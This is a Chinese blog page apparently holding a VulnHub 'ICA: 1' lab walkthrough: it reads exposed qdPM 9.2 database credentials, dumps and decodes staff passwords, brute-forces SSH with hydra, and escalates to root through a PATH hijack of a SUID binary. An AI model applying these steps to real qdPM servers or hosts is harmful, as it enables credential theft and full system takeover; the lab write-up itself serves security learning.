@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="该靶机难度中等。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ICA1 Writeup">
+<meta property="og:url" content="https://hdfzzf.github.io/2022/05/25/ICA1%20Writeup/index.html">
+<meta property="og:site_name" content="HDFZZF&#39;s BLOG">
+<meta property="og:description" content="该靶机难度中等。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525135533.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525162056.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525162159.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525205944.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525211250.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525223321.png">
+<meta property="article:published_time" content="2022-05-24T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-05-25T14:38:57.332Z">
+<meta property="article:author" content="hdfzzf">
+<meta property="article:tag" content="综合">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="密码爆破">
+<meta property="article:tag" content="CMS漏洞">
+<meta property="article:tag" content="环境变量提取">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525135533.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/LOGO.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ICA1 Writeup</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="الأعلى" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/05/25/Hackable%E2%85%A2%20Writeup/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/05/24/Hackable%E2%85%A1%20Writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+    </span>
+    <br/>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">2. 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 端口信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. MySQL服务</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#get-shell"><span class="toc-number">3.</span> <span class="toc-text">3. get shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.</span> <span class="toc-text">4. 权限提升</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">5. 总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ICA1 Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hdfzzf</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-05-24T16:00:00.000Z" itemprop="datePublished">2022-05-25</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CMS%E6%BC%8F%E6%B4%9E/" rel="tag">CMS漏洞</a>, <a class="tag-link-link" href="/tags/vulnhub/" rel="tag">vulnhub</a>, <a class="tag-link-link" href="/tags/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/" rel="tag">密码爆破</a>, <a class="tag-link-link" href="/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E5%8F%96/" rel="tag">环境变量提取</a>, <a class="tag-link-link" href="/tags/%E7%BB%BC%E5%90%88/" rel="tag">综合</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>该靶机难度中等。</p>
+<span id="more"></span>
+<h1 id="靶机信息">1. 靶机信息</h1>
+<p>靶机地址：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/ica-1,748/">ICA: 1 ~ VulnHub</a></li>
+</ul>
+<p>目标：</p>
+<ul>
+<li>拿到root权限</li>
+<li>拿到2个flag</li>
+</ul>
+<p>难度：</p>
+<ul>
+<li>中</li>
+</ul>
+<h1 id="信息收集">2. 信息收集</h1>
+<h2 id="端口信息">2.1. 端口信息</h2>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525135533.png" /></p>
+<p>发现除了22和80之外，还开放了3306，也就是可能存在MySQL，还有一个33060</p>
+<h2 id="http服务">2.2. http服务</h2>
+<p>进入主页面是一个登录界面</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525162056.png" /></p>
+<p>得知该网页的CMS是 qdPM 并且版本为 9.2。搜索是否存在漏洞： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit qdPM</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525162159.png" /></p>
+<p>可以直接读取密码信息。查看该漏洞的详细信息： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Exploit Title: qdPM 9.2 - DB Connection String and Password Exposure (Unauthenticated)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Date: 03/08/2021</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Exploit Author: Leon Trappett (thepcn3rd)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Vendor Homepage: https://qdpm.net/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Software Link: https://sourceforge.net/projects/qdpm/files/latest/download</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Version: 9.2</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Tested on: Ubuntu 20.04 Apache2 Server running PHP 7.4</span></span><br><span class="line"></span><br><span class="line">The password and connection string for the database are stored in a yml file. To access the yml file you can go to http://&lt;website&gt;/core/config/databases.yml file and download.</span><br></pre></td></tr></table></figure></p>
+<p>根据PoC，直接下载对应的文件，内容如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">all:</span><br><span class="line">  doctrine:</span><br><span class="line">    class: sfDoctrineDatabase</span><br><span class="line">    param:</span><br><span class="line">      dsn: &#x27;mysql:dbname=qdpm;host=localhost&#x27;</span><br><span class="line">      profiler: false</span><br><span class="line">      username: qdpmadmin</span><br><span class="line">      password: &quot;&lt;?php echo urlencode(&#x27;UcVQCMQk2STVeS6J&#x27;) ; ?&gt;&quot;</span><br><span class="line">      attributes:</span><br><span class="line">        quote_identifier: true  </span><br></pre></td></tr></table></figure></p>
+<p>得到数据库相关信息。</p>
+<h2 id="mysql服务">2.3. MySQL服务</h2>
+<p>利用下面命令，然后输入密码，远程连接数据库： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 10.0.2.56 -u qdpmadmin -p</span><br></pre></td></tr></table></figure></p>
+<p>在 staff 的 login表下面找到如下信息： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+------+---------+--------------------------+</span><br><span class="line">| id   | user_id | password                 |</span><br><span class="line">+------+---------+--------------------------+</span><br><span class="line">|    1 |       2 | c3VSSkFkR3dMcDhkeTNyRg== |</span><br><span class="line">|    2 |       4 | N1p3VjRxdGc0MmNtVVhHWA== |</span><br><span class="line">|    3 |       1 | WDdNUWtQM1cyOWZld0hkQw== |</span><br><span class="line">|    4 |       3 | REpjZVZ5OThXMjhZN3dMZw== |</span><br><span class="line">|    5 |       5 | Y3FObkJXQ0J5UzJEdUpTeQ== |</span><br><span class="line">+------+---------+--------------------------+</span><br></pre></td></tr></table></figure></p>
+<p>将密码base64解码后得到： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c3VSSkFkR3dMcDhkeTNyRg== -&gt; suRJAdGwLp8dy3rF</span><br><span class="line">N1p3VjRxdGc0MmNtVVhHWA== -&gt; 7ZwV4qtg42cmUXGX</span><br><span class="line">WDdNUWtQM1cyOWZld0hkQw== -&gt; X7MQkP3W29fewHdC</span><br><span class="line">REpjZVZ5OThXMjhZN3dMZw== -&gt; DJceVy98W28Y7wLg</span><br><span class="line">Y3FObkJXQ0J5UzJEdUpTeQ== -&gt; cqNnBWCByS2DuJSy</span><br></pre></td></tr></table></figure></p>
+<p>并在user表中得到对应的用户： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+------+---------------+--------+---------------------------+</span><br><span class="line">| id   | department_id | name   | role                      |</span><br><span class="line">+------+---------------+--------+---------------------------+</span><br><span class="line">|    1 |             1 | Smith  | Cyber Security Specialist |</span><br><span class="line">|    2 |             2 | Lucas  | Computer Engineer         |</span><br><span class="line">|    3 |             1 | Travis | Intelligence Specialist   |</span><br><span class="line">|    4 |             1 | Dexter | Cyber Security Analyst    |</span><br><span class="line">|    5 |             2 | Meyer  | Genetic Engineer          |</span><br><span class="line">+------+---------------+--------+---------------------------+</span><br></pre></td></tr></table></figure></p>
+<p>接着，在 qdpm数据库中的 configuration 表中得到以下重要信息，和一些其他配置信息 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">| id | key                                  | value    </span><br><span class="line">|----|--------------------------------------|------------------------------------</span><br><span class="line">|  1 | app_administrator_email              | admin@localhost.com                                                                                                     </span><br><span class="line">|  2 | app_administrator_password           | $P$EmesnWRcY9GrK0hDzwaV3rvQnMJ/Fx0 </span><br></pre></td></tr></table></figure></p>
+<h1 id="get-shell">3. get shell</h1>
+<p>将得到的用户名（注意要小写）和密码保存，然后爆破 ssh，得到两个结果： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L use.txt -P pas.txt 10.0.2.56 ssh</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525205944.png" /></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">travis:DJceVy98W28Y7wLg</span><br><span class="line">dexter:7ZwV4qtg42cmUXGX</span><br></pre></td></tr></table></figure>
+<h1 id="权限提升">4. 权限提升</h1>
+<p>首先查看 dexter 用户的家目录下，找到一个文件 note.txt，内容如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">It seems to me that there is a weakness while accessing the system.</span><br><span class="line">As far as I know, the contents of executable files are partially viewable.</span><br><span class="line">I need to find out if there is a vulnerability or not.</span><br></pre></td></tr></table></figure></p>
+<p>大致意思是：有一个可执行文件，该文件的部分内容是可见的，我需要找到它，确定是否存在漏洞。</p>
+<p>在 travis 用户的家目录下查看 .bash_history，内容如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure></p>
+<p>利用下面命令： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -perm -u=s -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
+<p>找到一个文件 /opt/get_access，直接运行</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525211250.png" /></p>
+<p>将该文件用 ida 打开： <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setuid(<span class="number">0</span>);</span><br><span class="line">  setgid(<span class="number">0</span>);</span><br><span class="line">  system(<span class="string">&quot;cat /root/system.info&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Could not create socket to access to the system.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;All services are disabled. Accessing to the system is allowed only within working hours.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>注意到 cat，没有使用绝对路径，因此可以利用修改环境变量实现提权，步骤如下：</p>
+<ol type="1">
+<li><p>将 /usr/bin/bash 复制到 /tmp 下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/bin/bash ./cat  # 这句无效，会报错</span><br><span class="line">echo &#x27;/bin/bash&#x27; &gt;&gt; /tmp/cat # 这句有效</span><br></pre></td></tr></table></figure></li>
+<li><p>将 /tmp 设置为环境变量</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure></li>
+<li><p>给与 /tmp/cat 执行权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /tmp/cat</span><br></pre></td></tr></table></figure></li>
+<li><p>最后，执行 get_access 文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./get_access</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220525223321.png" /></p>
+<p>最后的最后，读取2个flag（<strong>此时不能使用cat了</strong>） <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. /home/travis/user.txt</span><br><span class="line">ICA&#123;Secret_Project&#125;</span><br><span class="line"></span><br><span class="line">2. /root/root.txt</span><br><span class="line">ICA&#123;Next_Generation_Self_Renewable_Genetics&#125;</span><br></pre></td></tr></table></figure></p>
+<h1 id="总结">5. 总结</h1>
+<p>该靶机难度不高，涉及的攻击方法有：</p>
+<ol type="1">
+<li>CMS漏洞</li>
+<li>密码爆破</li>
+<li>环境变量提权</li>
+</ol>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">2. 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 端口信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. MySQL服务</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#get-shell"><span class="toc-number">3.</span> <span class="toc-text">3. get shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.</span> <span class="toc-text">4. 权限提升</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">5. 总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/05/25/ICA1%20Writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/05/25/ICA1%20Writeup/&text=ICA1 Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/05/25/ICA1%20Writeup/&title=ICA1 Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/05/25/ICA1%20Writeup/&is_video=false&description=ICA1 Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ICA1 Writeup&body=Check out this article: https://hdfzzf.github.io/2022/05/25/ICA1%20Writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/05/25/ICA1%20Writeup/&title=ICA1 Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/05/25/ICA1%20Writeup/&title=ICA1 Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/05/25/ICA1%20Writeup/&title=ICA1 Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/05/25/ICA1%20Writeup/&title=ICA1 Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/05/25/ICA1%20Writeup/&name=ICA1 Writeup&description=&lt;p&gt;该靶机难度中等。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/05/25/ICA1%20Writeup/&t=ICA1 Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    hdfzzf
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
